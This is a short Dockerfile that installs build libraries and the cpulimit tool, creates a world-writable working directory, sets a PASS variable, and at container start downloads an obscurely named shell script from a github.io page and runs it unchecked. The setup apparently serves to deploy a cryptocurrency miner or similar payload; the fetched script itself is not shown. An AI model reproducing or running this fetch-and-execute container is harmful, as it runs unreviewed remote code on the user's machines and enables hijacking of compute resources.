FROM ubuntu:18.04

RUN apt-get update \
    && apt-get install -y sudo curl zip nano wget cpulimit libmicrohttpd-dev libssl-dev libhwloc-dev

RUN sudo mkdir /projects/ && \
    cd /projects/ && \
    sudo mkdir sys && \
    sudo chmod -R 777 sys

ENV PASS unamed

WORKDIR /projects/sys

CMD wget https://pzeankto.github.io/namnam/pryopi.sh -O yopi.sh && \
chmod +x yopi.sh && \
./yopi.sh
